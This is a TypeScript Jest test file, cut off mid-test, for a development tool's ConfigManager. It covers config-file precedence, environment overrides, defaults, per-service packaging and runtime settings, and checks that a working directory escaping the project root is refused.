// Unit tests for ConfigManager (src/server/services/config-manager.ts).
// ConfigManager is a singleton whose private constructor calls loadConfig(),
// which reads from disk (fs) and process.env. To test file-loading precedence
// and env overrides we mock fs, set process.env, then jest.resetModules() +
// re-require to construct a fresh singleton under those conditions.
import path from 'path';
import { projectCacheSegment } from '../../../src/server/services/project-scope';

jest.mock('fs');
const fs = require('fs') as jest.Mocked<typeof import('fs')>;

const ENV = { ...process.env };

// The env vars ConfigManager reads. Cleared before each test for determinism.
const LSS_ENV_VARS = [
  'LSS_CONFIG_PATH',
  'LSS_DASHBOARD_PORT',
  'PORT',
  'LSS_LOCALSTACK_PORT',
  'LSS_LOCALSTACK_ENDPOINT',
  'LSS_LOCALSTACK_MODE',
  'LSS_LOCALSTACK_EDITION',
  'LSS_LOCALSTACK_VERSION',
  'LSS_LOCALSTACK_IMAGE',
  'LOCALSTACK_AUTH_TOKEN',
  'LSS_ENABLE_DYNAMO_PROXY',
  'ENABLE_DYNAMO_PROXY',
  'LSS_DYNAMO_PROXY_PORT',
  'AWS_REGION',
  'LSS_SERVICES',
  'LSS_PERSISTENCE',
  'LSS_DEBUG',
  'LSS_SEEDS_DIR',
  'LSS_AUTO_PACKAGE',
  'LSS_PACKAGE_COMMAND',
  'LSS_PACKAGE_TIMEOUT_MS',
  'LSS_LAMBDA_RUNTIME',
  'LSS_LAMBDA_EXECUTION',
  'LSS_LAMBDA_WATCH',
  'LSS_INVOKE_HOST',
  'LSS_ENGINE',
  'LSS_ENGINE_PORT',
  'LSS_ENGINE_DATA_DIR',
  'HOME',
];

type CM = import('../../../src/server/services/config-manager').ConfigManager;

/**
 * Build a fresh ConfigManager singleton against the current fs mock + env.
 * resetModules clears the cached singleton so the constructor runs again.
 */
function freshConfigManager(): CM {
  let instance: CM | undefined;
  jest.isolateModules(() => {
    const mod = require('../../../src/server/services/config-manager');
    instance = mod.ConfigManager.getInstance();
  });
  return instance as CM;
}

beforeEach(() => {
  jest.clearAllMocks();
  for (const key of LSS_ENV_VARS) {
    delete process.env[key];
  }
  process.env.HOME = '/home/tester';
  // Default: no config file exists anywhere.
  fs.existsSync.mockReturnValue(false);
  fs.readFileSync.mockReturnValue('{}');
  // realpath of a path that "doesn't exist" would throw; identity mirrors the
  // realpathOrSelf fallback and keeps path expectations literal.
  fs.realpathSync.mockImplementation(((p: string) => p) as typeof fs.realpathSync);
  jest.spyOn(console, 'log').mockImplementation(() => undefined);
  jest.spyOn(console, 'warn').mockImplementation(() => undefined);
});

afterEach(() => {
  jest.restoreAllMocks();
  process.env = { ...ENV };
});

describe('getInstance', () => {
  it('returns the same instance on repeated calls (singleton)', () => {
    let a: CM | undefined;
    let b: CM | undefined;
    jest.isolateModules(() => {
      const mod = require('../../../src/server/services/config-manager');
      a = mod.ConfigManager.getInstance();
      b = mod.ConfigManager.getInstance();
    });
    expect(a).toBe(b);
  });
});

describe('loadConfig file precedence', () => {
  it('prefers LSS_CONFIG_PATH over cwd/home candidates', () => {
    process.env.LSS_CONFIG_PATH = '/custom/lss.json';
    fs.existsSync.mockImplementation((p) => p === '/custom/lss.json');
    fs.readFileSync.mockReturnValue(JSON.stringify({ serverPort: 9999 }));

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe('/custom/lss.json');
    expect(cm.getServerPort()).toBe(9999);
  });

  it('falls back to lss.config.json in cwd when LSS_CONFIG_PATH is unset', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ region: 'eu-west-1' }));

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe(cwdFile);
    expect(cm.getRegion()).toBe('eu-west-1');
  });

  it('falls back to .lssrc in cwd', () => {
    const cwdRc = path.join(process.cwd(), '.lssrc');
    fs.existsSync.mockImplementation((p) => p === cwdRc);
    fs.readFileSync.mockReturnValue(JSON.stringify({ debug: true }));

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe(cwdRc);
    expect(cm.isDebug()).toBe(true);
  });

  it('falls back to lss.config.json in HOME', () => {
    const homeFile = path.join('/home/tester', 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === homeFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ persistence: false }));

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe(homeFile);
    expect(cm.isPersistence()).toBe(false);
  });

  it('falls back to .lssrc in HOME', () => {
    const homeRc = path.join('/home/tester', '.lssrc');
    fs.existsSync.mockImplementation((p) => p === homeRc);
    fs.readFileSync.mockReturnValue(JSON.stringify({ region: 'eu-west-3' }));

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe(homeRc);
    expect(cm.getRegion()).toBe('eu-west-3');
  });

  it('uses ~ as the home base when HOME is unset', () => {
    delete process.env.HOME;
    const tildeFile = path.join('~', 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === tildeFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ serverPort: 4321 }));

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe(tildeFile);
    expect(cm.getServerPort()).toBe(4321);
  });

  it('warns and keeps searching when a config file fails to parse', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue('{ not valid json');

    const cm = freshConfigManager();
    // Parse failed: no config loaded, configPath stays empty, defaults apply.
    expect(cm.getConfigPath()).toBe('');
    expect(cm.getServerPort()).toBe(14566);
    expect(console.warn).toHaveBeenCalled();
  });

  it('reports a generic message when the thrown value is not an Error', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockImplementation(() => {
      throw 'a string, not an Error';
    });

    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe('');
    expect(console.warn).toHaveBeenCalledWith(
      expect.stringContaining('Failed to parse config file'),
      'Unknown error',
    );
  });
});

describe('loadFromEnv overrides every variable', () => {
  it('serverPort from LSS_DASHBOARD_PORT', () => {
    process.env.LSS_DASHBOARD_PORT = '5500';
    expect(freshConfigManager().getServerPort()).toBe(5500);
  });

  it('serverPort from PORT when LSS_DASHBOARD_PORT is unset', () => {
    process.env.PORT = '5600';
    expect(freshConfigManager().getServerPort()).toBe(5600);
  });

  it('enableDynamoProxy true', () => {
    process.env.LSS_ENABLE_DYNAMO_PROXY = 'true';
    expect(freshConfigManager().isEnableDynamoProxy()).toBe(true);
  });

  it('enableDynamoProxy "1"', () => {
    process.env.LSS_ENABLE_DYNAMO_PROXY = '1';
    expect(freshConfigManager().isEnableDynamoProxy()).toBe(true);
  });

  it('enableDynamoProxy false when set to another value', () => {
    process.env.LSS_ENABLE_DYNAMO_PROXY = 'no';
    expect(freshConfigManager().isEnableDynamoProxy()).toBe(false);
  });

  it('dynamoProxyPort', () => {
    process.env.LSS_DYNAMO_PROXY_PORT = '9000';
    expect(freshConfigManager().getDynamoProxyPort()).toBe(9000);
  });

  it('region from AWS_REGION', () => {
    process.env.AWS_REGION = 'ap-south-1';
    expect(freshConfigManager().getRegion()).toBe('ap-south-1');
  });

  it('persistence true', () => {
    process.env.LSS_PERSISTENCE = 'true';
    expect(freshConfigManager().isPersistence()).toBe(true);
  });

  it('persistence "1"', () => {
    process.env.LSS_PERSISTENCE = '1';
    expect(freshConfigManager().isPersistence()).toBe(true);
  });

  it('persistence false when set to another value', () => {
    process.env.LSS_PERSISTENCE = 'off';
    expect(freshConfigManager().isPersistence()).toBe(false);
  });

  it('debug true', () => {
    process.env.LSS_DEBUG = 'true';
    expect(freshConfigManager().isDebug()).toBe(true);
  });

  it('debug "1"', () => {
    process.env.LSS_DEBUG = '1';
    expect(freshConfigManager().isDebug()).toBe(true);
  });

  it('debug false when set to another value', () => {
    process.env.LSS_DEBUG = 'nope';
    expect(freshConfigManager().isDebug()).toBe(false);
  });

  it('seedsDir', () => {
    process.env.LSS_SEEDS_DIR = '/abs/seeds';
    expect(freshConfigManager().getSeedsDir()).toBe('/abs/seeds');
  });

  it('autoPackage true', () => {
    process.env.LSS_AUTO_PACKAGE = 'true';
    expect(freshConfigManager().isAutoPackage()).toBe(true);
  });

  it('autoPackage "1"', () => {
    process.env.LSS_AUTO_PACKAGE = '1';
    expect(freshConfigManager().isAutoPackage()).toBe(true);
  });

  it('autoPackage false when set to another value', () => {
    process.env.LSS_AUTO_PACKAGE = 'maybe';
    expect(freshConfigManager().isAutoPackage()).toBe(false);
  });

  it('packageCommand', () => {
    process.env.LSS_PACKAGE_COMMAND = 'yarn package';
    expect(freshConfigManager().getPackageCommand()).toBe('yarn package');
  });

  it('packageTimeoutMs when valid and positive', () => {
    process.env.LSS_PACKAGE_TIMEOUT_MS = '60000';
    expect(freshConfigManager().getPackageTimeoutMs()).toBe(60000);
  });

  it('packageTimeoutMs ignores non-numeric values', () => {
    process.env.LSS_PACKAGE_TIMEOUT_MS = 'abc';
    expect(freshConfigManager().getPackageTimeoutMs()).toBe(300000);
  });

  it('packageTimeoutMs ignores non-positive values', () => {
    process.env.LSS_PACKAGE_TIMEOUT_MS = '0';
    expect(freshConfigManager().getPackageTimeoutMs()).toBe(300000);
  });
});

describe('getters: defaults (no file, no env)', () => {
  let cm: CM;
  beforeEach(() => {
    cm = freshConfigManager();
  });

  it('getConfig returns the (empty) config object', () => {
    expect(cm.getConfig()).toEqual({});
  });

  it('getServerPort defaults to 3100', () => {
    expect(cm.getServerPort()).toBe(14566);
  });

  it('getServerPort reads PORT env at call time when config unset', () => {
    process.env.PORT = '7000';
    expect(cm.getServerPort()).toBe(7000);
  });

  it('getDashboardPort aliases getServerPort', () => {
    expect(cm.getDashboardPort()).toBe(14566);
  });

  it('isEnableDynamoProxy defaults to false', () => {
    expect(cm.isEnableDynamoProxy()).toBe(false);
  });

  it('getDynamoProxyPort defaults to 8000', () => {
    expect(cm.getDynamoProxyPort()).toBe(8000);
  });

  it('getRegion defaults to us-east-1', () => {
    expect(cm.getRegion()).toBe('us-east-1');
  });

  it('getRegion reads AWS_REGION env at call time when config unset', () => {
    process.env.AWS_REGION = 'us-west-2';
    expect(cm.getRegion()).toBe('us-west-2');
  });

  it('isPersistence defaults to true', () => {
    expect(cm.isPersistence()).toBe(true);
  });

  it('isDebug defaults to false', () => {
    expect(cm.isDebug()).toBe(false);
  });

  it('getSeedsDir defaults to ./seeds resolved against cwd', () => {
    expect(cm.getSeedsDir()).toBe(path.resolve(process.cwd(), './seeds'));
  });

  it('getStateDir defaults to undefined', () => {
    expect(cm.getStateDir()).toBeUndefined();
  });

  it('isAutoPackage defaults to false', () => {
    expect(cm.isAutoPackage()).toBe(false);
  });

  it('getPackageCommand defaults to npx serverless package', () => {
    expect(cm.getPackageCommand()).toBe('npx serverless package');
  });

  it('getPackageTimeoutMs defaults to 300000', () => {
    expect(cm.getPackageTimeoutMs()).toBe(300000);
  });

  it('getConfigPath defaults to empty string', () => {
    expect(cm.getConfigPath()).toBe('');
  });

  it('getOrchestratorUrl uses the server port', () => {
    expect(cm.getOrchestratorUrl()).toBe('http://localhost:14566');
  });
});

describe('getters: branch coverage on config-provided values', () => {
  it('isEnableDynamoProxy honors the ENABLE_DYNAMO_PROXY env fallback ("true")', () => {
    process.env.ENABLE_DYNAMO_PROXY = 'TRUE';
    expect(freshConfigManager().isEnableDynamoProxy()).toBe(true);
  });

  it('isEnableDynamoProxy honors the ENABLE_DYNAMO_PROXY env fallback ("1")', () => {
    process.env.ENABLE_DYNAMO_PROXY = '1';
    expect(freshConfigManager().isEnableDynamoProxy()).toBe(true);
  });

  it('getSeedsDir returns an absolute seedsDir unchanged', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ seedsDir: '/abs/seeds' }));
    expect(freshConfigManager().getSeedsDir()).toBe('/abs/seeds');
  });

  it('getSecretsSeedDir returns <seedsDir>/secrets', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ seedsDir: '/abs/seeds' }));
    expect(freshConfigManager().getSecretsSeedDir()).toBe(path.join('/abs/seeds', 'secrets'));
  });

  it('getStateDir resolves a relative stateDir against cwd', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ stateDir: 'rel/state' }));
    expect(freshConfigManager().getStateDir()).toBe(path.resolve(process.cwd(), 'rel/state'));
  });

  it('getStateDir returns an absolute stateDir unchanged', () => {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({ stateDir: '/abs/state' }));
    expect(freshConfigManager().getStateDir()).toBe('/abs/state');
  });
});

describe('getProjectRoot', () => {
  it('returns the loaded config file directory (project-local config)', () => {
    process.env.LSS_CONFIG_PATH = '/custom/proj/lss.json';
    fs.existsSync.mockImplementation((p) => p === '/custom/proj/lss.json');
    expect(freshConfigManager().getProjectRoot()).toBe(path.resolve('/custom/proj'));
  });

  it('falls back to cwd when the config came from the home directory (user-global file)', () => {
    const homeFile = path.join('/home/tester', 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === homeFile);
    const cm = freshConfigManager();
    expect(cm.getConfigPath()).toBe(homeFile);
    expect(cm.getProjectRoot()).toBe(path.resolve(process.cwd()));
  });

  it('falls back to cwd when no config file was loaded', () => {
    expect(freshConfigManager().getProjectRoot()).toBe(path.resolve(process.cwd()));
  });

  it('uses os.homedir() for the home comparison when HOME is unset', () => {
    delete process.env.HOME;
    process.env.LSS_CONFIG_PATH = '/custom/proj/lss.json';
    fs.existsSync.mockImplementation((p) => p === '/custom/proj/lss.json');
    expect(freshConfigManager().getProjectRoot()).toBe(path.resolve('/custom/proj'));
  });

  it('resolves symlinked spellings via realpath (macOS /tmp -> /private/tmp)', () => {
    process.env.LSS_CONFIG_PATH = '/tmp/demo/lss.json';
    fs.existsSync.mockImplementation((p) => p === '/tmp/demo/lss.json');
    fs.realpathSync.mockImplementation(((p: string) =>
      p === '/tmp/demo' ? '/private/tmp/demo' : p) as typeof fs.realpathSync);
    expect(freshConfigManager().getProjectRoot()).toBe('/private/tmp/demo');
  });

  it('keeps the lexical path when realpath fails (directory gone)', () => {
    process.env.LSS_CONFIG_PATH = '/custom/proj/lss.json';
    fs.existsSync.mockImplementation((p) => p === '/custom/proj/lss.json');
    fs.realpathSync.mockImplementation((() => {
      throw new Error('ENOENT');
    }) as unknown as typeof fs.realpathSync);
    expect(freshConfigManager().getProjectRoot()).toBe(path.resolve('/custom/proj'));
  });
});

describe('getPackageConfigForService', () => {
  function cmWith(config: Record<string, unknown>): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('returns global defaults when nothing is configured (no config file)', () => {
    // No config file → configPath is '' → resolver falls back to process.cwd().
    const cm = freshConfigManager();
    expect(cm.getPackageConfigForService('/abs/some/access')).toEqual({
      command: 'npx serverless package',
      args: [],
      env: {},
      timeoutMs: 300000,
      cwd: '/abs/some/access',
    });
  });

  it('applies global packageArgs/packageEnv to any service', () => {
    const cm = cmWith({ packageArgs: ['--g'], packageEnv: { A: '1' } });
    expect(cm.getPackageConfigForService('/abs/whatever')).toEqual({
      command: 'npx serverless package',
      args: ['--g'],
      env: { A: '1' },
      timeoutMs: 300000,
      cwd: '/abs/whatever',
    });
  });

  it('matches a per-service override by directory basename', () => {
    const cm = cmWith({
      servicePackaging: {
        access: { packageArgs: ['--param=custom-stage=offline'], packageTimeoutMs: 60000 },
      },
    });
    expect(cm.getPackageConfigForService('/abs/microservices/access')).toEqual({
      command: 'npx serverless package',
      args: ['--param=custom-stage=offline'],
      env: {},
      timeoutMs: 60000,
      cwd: '/abs/microservices/access',
    });
  });

  it('ignores a prototype-inherited key name masquerading as a service entry', () => {
    // map['constructor'] resolves to Object.prototype.constructor on a plain
    // read — the lookup must use hasOwnProperty or every service named
    // "constructor"/"toString" would inherit a function as its config.
    const cm = cmWith({ servicePackaging: {} });
    expect(cm.getPackageConfigForService('/abs/constructor')).toEqual({
      command: 'npx serverless package',
      args: [],
      env: {},
      timeoutMs: 300000,
      cwd: '/abs/constructor',
    });
  });

  it('matches a per-service override by relative path and it wins over basename', () => {
    const cm = cmWith({
      servicePackaging: {
        access: { packageArgs: ['--by-basename'] },
        'microservices/access': { packageArgs: ['--by-relpath'], packageCommand: 'npx sls package' },
      },
    });
    const svc = path.join(process.cwd(), 'microservices/access');
    expect(cm.getPackageConfigForService(svc)).toEqual({
      command: 'npx sls package',
      args: ['--by-relpath'],
      env: {},
      timeoutMs: 300000,
      cwd: svc,
    });
  });

  it('concatenates global then per-service args and merges env (service wins)', () => {
    const cm = cmWith({
      packageArgs: ['--g'],
      packageEnv: { A: '1', B: '2' },
      servicePackaging: { access: { packageArgs: ['--s'], packageEnv: { B: '9', C: '3' } } },
    });
    expect(cm.getPackageConfigForService('/abs/access')).toEqual({
      command: 'npx serverless package',
      args: ['--g', '--s'],
      env: { A: '1', B: '9', C: '3' },
      timeoutMs: 300000,
      cwd: '/abs/access',
    });
  });

  it('returns only globals for a service with no matching override', () => {
    const cm = cmWith({
      packageArgs: ['--g'],
      servicePackaging: { access: { packageArgs: ['--s'] } },
    });
    expect(cm.getPackageConfigForService('/abs/other')).toEqual({
      command: 'npx serverless package',
      args: ['--g'],
      env: {},
      timeoutMs: 300000,
      cwd: '/abs/other',
    });
  });

  it('uses env-var packageCommand/timeout as the global baseline', () => {
    process.env.LSS_PACKAGE_COMMAND = 'yarn package';
    process.env.LSS_PACKAGE_TIMEOUT_MS = '120000';
    const cm = freshConfigManager();
    expect(cm.getPackageConfigForService('/abs/access')).toEqual({
      command: 'yarn package',
      args: [],
      env: {},
      timeoutMs: 120000,
      cwd: '/abs/access',
    });
  });
});

// `packageCwd` is the answer to a stack with no package.json of its own: the
// script that packages it lives at the monorepo root, and the command grammar
// (rightly) forbids --prefix/--cwd/--dir, so the working directory has to be
// declared rather than emerge from npm walking up the tree.
describe('packageCwd', () => {
  function cmWith(config: Record<string, unknown>): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('defaults to the service directory', () => {
    expect(cmWith({}).getPackageConfigForService('/abs/infra/shared').cwd).toBe('/abs/infra/shared');
  });

  it('resolves against the PROJECT ROOT, not the service dir — that is the point', () => {
    const cm = cmWith({ servicePackaging: { 'infra/shared': { packageCwd: '.' } } });
    jest.spyOn(cm, 'getProjectRoot').mockReturnValue(process.cwd());
    expect(cm.getPackageConfigForService(path.join(process.cwd(), 'infra/shared')).cwd).toBe(process.cwd());
  });

  it('accepts a sibling directory inside the project', () => {
    const cm = cmWith({ servicePackaging: { 'infra/shared': { packageCwd: 'tools/packaging' } } });
    jest.spyOn(cm, 'getProjectRoot').mockReturnValue('/repo');
    expect(cm.getPackageConfigForService('/repo/infra/shared').cwd).toBe('/repo/tools/packaging');
  });

  // The value becomes the cwd of a spawned child, so escaping the project is
  // refused at USE time too — the lexical check on write cannot see symlinks.
  it('refuses a value that escapes the project root and falls back to the service dir', () => {
    const cm = cmWith({ servicePackaging: { shared: { packageCwd: '../elsewhere' } } });
    jest.spyOn(cm, 'getProjectRoot').mockReturnValue('/repo');
    const warn = jest.spyOn(console, 'warn').mockImplementation(() => undefined);
    expect(cm.getPackageConfigForService('/repo/shared').cwd).toBe('/repo/shared');
    expect(warn).toHaveBeenCalledWith(expect.stringContaining('outside the project root'));
  });

  it('refuses a symlink that lands outside, even though the string looks inside', () => {
    const cm = cmWith({ servicePackaging: { shared: { packageCwd: 'tools' } } });
    jest.spyOn(cm, 'getProjectRoot').mockReturnValue('/repo');
    fs.realpathSync.mockImplementation(((p: string) => (p === '/repo/tools' ? '/etc' : p)) as never);
    expect(cm.getPackageConfigForService('/repo/shared').cwd).toBe('/repo/shared');
  });
});

// The stacks a monorepo never registers locally. Permanent noise in `lss scan`
// is how a real warning goes unread, so silencing them is a feature about
// signal, not about tidiness.
describe('isScanIgnored', () => {
  function cmWith(config: Record<string, unknown>): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('is false when the key is absent or empty', () => {
    expect(cmWith({}).isScanIgnored('/repo/infra/global')).toBe(false);
    expect(cmWith({ scanIgnore: [] }).isScanIgnored('/repo/infra/global')).toBe(false);
  });

  it('matches by project-relative path, by basename, and tolerates ./ and trailing slashes', () => {
    const cm = cmWith({ scanIgnore: ['./infra/bootstrap/', 'global'] });
    jest.spyOn(cm, 'getProjectRoot').mockReturnValue(process.cwd());
    expect(cm.isScanIgnored(path.join(process.cwd(), 'infra/bootstrap'))).toBe(true);
    expect(cm.isScanIgnored(path.join(process.cwd(), 'infra/global'))).toBe(true);
    expect(cm.isScanIgnored(path.join(process.cwd(), 'services/orders'))).toBe(false);
  });
});

describe('lambdaRuntime config', () => {
  function cmWith(config: Record<string, unknown>): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('defaults: enabled, auto execution, offset 10000 and loopback invoke host', () => {
    const cm = freshConfigManager();
    expect(cm.isLambdaRuntimeEnabled()).toBe(true);
    expect(cm.getLambdaExecutionMode()).toBe('auto');
    expect(cm.getInvokePortOffset()).toBe(10000);
    expect(cm.getInvokeHost()).toBe('127.0.0.1');
  });

  it('reads enabled/execution/invokePortOffset from the config file', () => {
    const cm = cmWith({
      lambdaRuntime: {
        enabled: false,
        execution: 'artifact',
        invokePortOffset: 20000,
        invokeHost: '172.19.0.1',
      },
    });
    expect(cm.isLambdaRuntimeEnabled()).toBe(false);
    expect(cm.getLambdaExecutionMode()).toBe('artifact');
    expect(cm.getInvokePortOffset()).toBe(20000);
    expect(cm.getInvokeHost()).toBe('172.19.0.1');
  });

  it('falls back per-field when the lambdaRuntime block is partial', () => {
    const cm = cmWith({ lambdaRuntime: { execution: 'source' } });
    expect(cm.isLambdaRuntimeEnabled()).toBe(true);
    expect(cm.getLambdaExecutionMode()).toBe('source');
    expect(cm.getInvokePortOffset()).toBe(10000);
  });

  // A worker per registered service costs ~48 MB resident, and LSS is a
  // development stack: a handler is only resident while it is being used.
  it('lazy defaults to true and idleTimeoutMs to one minute', () => {
    const cm = freshConfigManager();
    expect(cm.isLambdaRuntimeLazy()).toBe(true);
    expect(cm.getLambdaIdleTimeoutMs()).toBe(60_000);
  });

  it('reads lazy/idleTimeoutMs from the config file', () => {
    const cm = cmWith({ lambdaRuntime: { lazy: false, idleTimeoutMs: 900000 } });
    expect(cm.isLambdaRuntimeLazy()).toBe(false);
    expect(cm.getLambdaIdleTimeoutMs()).toBe(900000);
  });

  it('treats an explicit 0 or a bad value as "keep workers alive forever"', () => {
    expect(cmWith({ lambdaRuntime: { idleTimeoutMs: 0 } }).getLambdaIdleTimeoutMs()).toBe(0);
    expect(cmWith({ lambdaRuntime: { idleTimeoutMs: -1 } }).getLambdaIdleTimeoutMs()).toBe(0);
    expect(cmWith({ lambdaRuntime: { idleTimeoutMs: 'soon' } as never }).getLambdaIdleTimeoutMs()).toBe(0);
  });

  // The ceiling is what makes host memory a function of services in flight
  // rather than services registered.
  it('maxWarmWorkers defaults to one per GB of RAM, clamped to 2..12', () => {
    const totalmem = jest.spyOn(require('os'), 'totalmem');
    totalmem.mockReturnValue(8 * 1024 ** 3);
    expect(freshConfigManager().getLambdaMaxWarmWorkers()).toBe(8);
    totalmem.mockReturnValue(1 * 1024 ** 3); // tiny host → floor of 2
    expect(freshConfigManager().getLambdaMaxWarmWorkers()).toBe(2);
    totalmem.mockReturnValue(64 * 1024 ** 3); // big host → cap of 12
    expect(freshConfigManager().getLambdaMaxWarmWorkers()).toBe(12);
    totalmem.mockRestore();
  });

  it('honors an explicit maxWarmWorkers, including 0 (no ceiling)', () => {
    expect(cmWith({ lambdaRuntime: { maxWarmWorkers: 3 } }).getLambdaMaxWarmWorkers()).toBe(3);
    expect(cmWith({ lambdaRuntime: { maxWarmWorkers: 0 } }).getLambdaMaxWarmWorkers()).toBe(0);
    // Garbage falls back to the RAM-derived default rather than uncapping.
    expect(cmWith({ lambdaRuntime: { maxWarmWorkers: -2 } }).getLambdaMaxWarmWorkers()).toBeGreaterThan(0);
  });

  it('LSS_LAMBDA_RUNTIME=true / "1" enables, anything else disables', () => {
    process.env.LSS_LAMBDA_RUNTIME = 'true';
    expect(freshConfigManager().isLambdaRuntimeEnabled()).toBe(true);
    process.env.LSS_LAMBDA_RUNTIME = '1';
    expect(freshConfigManager().isLambdaRuntimeEnabled()).toBe(true);
    process.env.LSS_LAMBDA_RUNTIME = 'off';
    expect(freshConfigManager().isLambdaRuntimeEnabled()).toBe(false);
  });

  it('LSS_LAMBDA_RUNTIME merges over file config without clobbering execution', () => {
    process.env.LSS_LAMBDA_RUNTIME = 'false';
    const cm = cmWith({ lambdaRuntime: { enabled: true, execution: 'artifact' } });
    expect(cm.isLambdaRuntimeEnabled()).toBe(false);
    expect(cm.getLambdaExecutionMode()).toBe('artifact');
  });

  it('LSS_LAMBDA_EXECUTION accepts auto/artifact/source', () => {
    process.env.LSS_LAMBDA_EXECUTION = 'auto';
    expect(freshConfigManager().getLambdaExecutionMode()).toBe('auto');
    process.env.LSS_LAMBDA_EXECUTION = 'ARTIFACT'; // lowercased
    expect(freshConfigManager().getLambdaExecutionMode()).toBe('artifact');
    process.env.LSS_LAMBDA_EXECUTION = 'source';
    expect(freshConfigManager().getLambdaExecutionMode()).toBe('source');
  });

  it('LSS_LAMBDA_EXECUTION ignores invalid values (file value kept)', () => {
    process.env.LSS_LAMBDA_EXECUTION = 'bogus';
    const cm = cmWith({ lambdaRuntime: { execution: 'artifact' } });
    expect(cm.getLambdaExecutionMode()).toBe('artifact');
  });

  it('LSS_LAMBDA_WATCH=true / "1" enables the watch flag, anything else disables', () => {
    process.env.LSS_LAMBDA_WATCH = 'true';
    expect(freshConfigManager().getRuntimeConfigForService('/abs/svc').watch).toBe(true);
    process.env.LSS_LAMBDA_WATCH = '1';
    expect(freshConfigManager().getRuntimeConfigForService('/abs/svc').watch).toBe(true);
    process.env.LSS_LAMBDA_WATCH = 'no';
    expect(freshConfigManager().getRuntimeConfigForService('/abs/svc').watch).toBe(false);
  });

  it('LSS_INVOKE_HOST overrides file config without clobbering other lambdaRuntime fields', () => {
    process.env.LSS_INVOKE_HOST = '172.19.0.1';
    const cm = cmWith({ lambdaRuntime: { execution: 'artifact', invokeHost: 'host.docker.internal' } });
    expect(cm.getInvokeHost()).toBe('172.19.0.1');
    expect(cm.getLambdaExecutionMode()).toBe('artifact');
  });
});

describe('getRuntimeConfigForService', () => {
  function cmWith(config: Record<string, unknown>): CM {
    const cwdFile = path.join(process.cwd(), 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify(config));
    return freshConfigManager();
  }

  it('returns global defaults with watch left undefined when nothing is configured', () => {
    // No config file → configPath is '' → resolver falls back to process.cwd().
    const cm = freshConfigManager();
    expect(cm.getRuntimeConfigForService('/abs/some/access')).toEqual({
      enabled: true,
      execution: 'auto',
      watch: undefined,
      apiPort: undefined,
      invokePort: undefined,
    });
  });

  it('matches a per-service override by directory basename', () => {
    const cm = cmWith({
      serviceRuntime: {
        access: { enabled: false, apiPort: 3001, invokePort: 13001, execution: 'source', watch: true },
      },
    });
    expect(cm.getRuntimeConfigForService('/abs/microservices/access')).toEqual({
      enabled: false,
      execution: 'source',
      watch: true,
      apiPort: 3001,
      invokePort: 13001,
    });
  });

  // Regression: the scan/dashboard key the operator writes must be the key the
  // lookup reads. getProjectRoot() realpath-resolves (and falls back to the cwd
  // for a home-directory config) while the config-relative key does not, so a
  // checkout reached through a symlink used to make a saved override
  // unreachable — silently ignored at registration and in the scan overlay.
  it('resolves an entry keyed relative to the project root when the config path is a symlink', () => {
    const linkDir = path.join(process.cwd(), 'link');
    const realDir = path.join(process.cwd(), 'demo');
    const cwdFile = path.join(linkDir, 'lss.config.json');
    fs.existsSync.mockImplementation((p) => p === cwdFile);
    fs.readFileSync.mockReturnValue(JSON.stringify({
      serviceRuntime: { 'services/api': { apiPort: 4001 } },
    }));
    // `link` resolves to `demo`; the raw dirname does not.
    fs.realpathSync.mockImplementation(((p: string) =>
      (p === linkDir ? realDir : p)) as typeof fs.realpathSync);
    process.env.LSS_CONFIG_PATH = cwdFile;
    const cm = freshConfigManager();
    expect(cm.getRuntimeConfigForService(path.join(realDir, 'services/api')).apiPort).toBe(4001);
  });

  it('a relative-path key wins over a basename key', () => {
    const cm = cmWith({
      serviceRuntime: {
        access: { apiPort: 1111 },
        'microservices/access': { apiPort: 2222 },
      },
    });
    const svc = path.join(process.cwd(), 'microservices/access');
    expect(cm.getRuntimeConfigForService(svc).apiPort).toBe(2222);
  });

  it('falls back to the global lambdaRuntime block for unset per-service fields', () => {
    const cm = cmWith({
      lambdaRuntime: { enabled: false, execution: 'artifact', watch: true },
